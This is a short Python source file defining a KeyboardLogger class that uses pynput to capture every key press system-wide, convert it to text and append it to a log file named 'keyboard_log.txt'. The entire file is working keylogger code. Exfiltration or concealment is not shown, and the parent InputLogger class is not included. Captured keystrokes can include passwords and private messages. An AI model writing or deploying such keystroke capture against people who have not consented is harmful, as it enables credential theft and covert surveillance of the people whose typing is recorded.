from pynput import keyboard

from input_logger import InputLogger

class KeyboardLogger(InputLogger):
    def __init__(self, time_interval):
        super().__init__(time_interval)
        self.log += "=====KeyboardLogger Started====="

    def on_press(self, key):
        ###
        try:
            keyStr = str(key.char)
        except AttributeError:
            if key == key.space:
                keyStr = "SPACE"
            elif key == key.esc:
                keyStr = "ESC"
            else:
                keyStr = " " + str(key) + " "
        ###
        log = str(keyStr) + " pressed" + "\n"
        self.add_log(log)
        
    def run(self):
        self.save_log('keyboard_log.txt')
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            keyboard_listener.join()